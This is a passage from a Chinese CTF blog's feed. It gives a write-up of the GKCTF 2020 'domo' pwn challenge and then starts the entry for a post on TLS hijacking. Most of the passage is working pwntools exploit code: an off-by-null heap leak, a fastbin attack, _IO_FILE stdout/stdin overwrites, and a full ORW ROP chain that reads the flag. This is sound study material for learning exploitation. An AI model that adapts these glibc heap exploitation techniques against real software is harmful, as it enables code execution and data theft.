class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>))</span><br><span class="line">main_arena_88 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line"></span><br><span class="line">malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0xf03a4</span>+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10a</span>+<span class="number">0x10</span></span><br><span class="line">info(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x40</span>, p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(heap_addr+<span class="number">0x18</span>) +</span><br><span class="line">       p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>))  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdin_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line"></span><br><span class="line">fake_chunk = _IO_2_1_stdin_+<span class="number">160</span>-<span class="number">3</span></span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk))  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0xa8</span>, p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">fake_vtable = heap_addr+<span class="number">0xf0</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>) * \</span><br><span class="line">    <span class="number">2</span>+p64(fake_vtable)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">create(<span class="number">0x63</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>以上解法为<a class="link"   href="https://nocbtm.github.io/" >nocbtm<i class="fas fa-external-link-alt"></i></a>师傅的思路。下面为出题人的思路。</p><p>其实出题人的思路在前半部分部分和上面是一样的，同样需要leak libc addr，leak heap addr，fastbin attack这三步攻击。</p><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>在libc中的environ里存放的是stack的地址。</p><p><img src="/images/image-20220210152730000.png" alt="image-20220210152730000"></p><p>下面就是通过_IO_2_1_stdout_泄漏出environ当中的栈地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">fake_chunk = _IO_2_1_stdout_ - <span class="number">0x43</span></span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;&#x27;</span>) </span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])+p64(<span class="number">0xfbad1800</span>)+p64(_IO_2_1_stdout_+<span class="number">131</span>) * \</span><br><span class="line">    <span class="number">3</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]) + \</span><br><span class="line">    p64(libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]+<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">create(<span class="number">0x63</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">b&#x27;1: Add a user&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">ret_addr = stack_addr-<span class="number">0xf0</span></span><br><span class="line">info(<span class="string">&#x27;stack_addr=&gt;&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220210155218812.png" alt="image-20220210155218812"></p><p>然后经过偏移计算获得main函数的返回地址。</p><h3 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h3><p>这里需要使用_IO_2_1_stdin_(不清楚的可以看看这篇文章<a href="https://cv196082.gitee.io/2021/12/06/echo-back/">echo back</a>)来修改返回地址的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdin_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">fake_chunk = _IO_2_1_stdin_-<span class="number">0x28</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>) </span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)) </span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;flag\x00&#x27;</span>)</span><br><span class="line">flag_addr = heap_addr+<span class="number">0x210</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">edit(fake_chunk+<span class="number">0x8</span>, p8(<span class="number">0x71</span>))</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220210163934654.png" alt="image-20220210163934654"></p><p>一样的操作，找到一个假的chunk然后修改_IO_buf_base和_IO_buf_end</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(libc_base +</span><br><span class="line">                     libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(ret_addr-<span class="number">2</span>)+p64(ret_addr+<span class="number">0x118</span>)</span><br><span class="line">create(<span class="number">0x60</span>, payload)  </span><br><span class="line">info(<span class="string">&#x27;fake_chunk=&gt;&#x27;</span>+<span class="built_in">hex</span>(fake_chunk))</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220210164732458.png" alt="image-20220210164732458"></p><p>紧接着直接申请chunk过去然后修改掉上面两个指针的值，效果如上图。</p><p><img src="/images/image-20220210165013617.png" alt="image-20220210165013617"></p><p><strong>解释一下为什么要在_IO_buf_base处写上ret_addr-2   =&gt;   因为在最后输入的时候我们是在这个scanf当中输入的，所以我们需要预留两个位置输入b’5\n’</strong></p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>最后因为题目在最后开启了沙盒所以我们只能用orw的方式来读flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rdx = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;5\n&#x27;</span>+p64(pop_rdi)+p64(flag_addr) + \</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi) + \</span><br><span class="line">    p64(flag_addr+<span class="number">8</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi) + p64(flag_addr+<span class="number">8</span>) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">0x100</span>)+p64(write_addr)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure><p>最后的栈内情况</p><p><img src="/images/image-20220210171317730.png" alt="image-20220210171317730"></p><h3 id="综上exp"><a href="#综上exp" class="headerlink" title="综上exp"></a>综上exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;1.14.71.254&#x27;, 28041)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">address, num</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(address), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;num:&#x27;</span>)</span><br><span class="line">    r.sendline(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)  <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>))</span><br><span class="line">main_arena_88 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line"></span><br><span class="line">malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span>+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10a</span>+<span class="number">0x10</span></span><br><span class="line">info(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x40</span>, p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(heap_addr+<span class="number">0x18</span>) +</span><br><span class="line">       p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>))  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdout_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">fake_chunk = _IO_2_1_stdout_ - <span class="number">0x43</span></span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk))  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])+p64(<span class="number">0xfbad1800</span>)+p64(_IO_2_1_stdout_+<span class="number">131</span>) * \</span><br><span class="line">    <span class="number">3</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]) + \</span><br><span class="line">    p64(libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]+<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x63</span>, payload)  <span class="comment"># 3</span></span><br><span class="line">r.recvline()</span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">b&#x27;1: Add a user&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">ret_addr = stack_addr-<span class="number">0xf0</span></span><br><span class="line">info(<span class="string">&#x27;ret_addr=&gt;&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdin_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">fake_chunk = _IO_2_1_stdin_-<span class="number">0x28</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk))  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;flag\x00&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">flag_addr = heap_addr+<span class="number">0x210</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">edit(fake_chunk+<span class="number">0x8</span>, p8(<span class="number">0x71</span>))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(libc_base +</span><br><span class="line">                     libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(ret_addr-<span class="number">2</span>)+p64(ret_addr+<span class="number">0x118</span>)</span><br><span class="line">create(<span class="number">0x60</span>, payload)  <span class="comment"># 5</span></span><br><span class="line">info(<span class="string">&#x27;fake_chunk=&gt;&#x27;</span>+<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rdx = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;5\n&#x27;</span>+p64(pop_rdi)+p64(flag_addr) + \</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi) + \</span><br><span class="line">    p64(flag_addr+<span class="number">8</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi) + p64(flag_addr+<span class="number">8</span>) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">0x100</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://blog.play2win.top/2020/05/27/GKCTF%202020%20Domo%E5%88%86%E6%9E%90/#0x0-leak-libc-address%E5%92%8Cheap-address" >https://blog.play2win.top/2020/05/27/GKCTF%202020%20Domo%E5%88%86%E6%9E%90/#0x0-leak-libc-address%E5%92%8Cheap-address<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现一场比赛被第一道题卡了贼久，我太菜了，越学pwn越在想要是比赛第一题就是这个我连一道题都做不出来怎么办哦。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;吐槽:&lt;/strong&gt; nss给的libc怎么也不对啊？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/image-20220</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="_IO_FILE" scheme="https://cv196082.gitee.io/tags/IO-FILE/"/>
    
    <category term="fastbin attack" scheme="https://cv196082.gitee.io/tags/fastbin-attack/"/>
    
    <category term="vtable" scheme="https://cv196082.gitee.io/tags/vtable/"/>
    
    <category term="off by null" scheme="https://cv196082.gitee.io/tags/off-by-null/"/>
    
  </entry>
  
  <entry>
    <title>劫持TLS结构</title>
    <link href="https://cv196082.gitee.io/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/"/>
    <id>https://cv196082.gitee.io/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/</id>
    <published>2022-02-04T06:26:25.000Z</published>
    <updated>2022-03-03T05:32:15.867Z</updated>
    
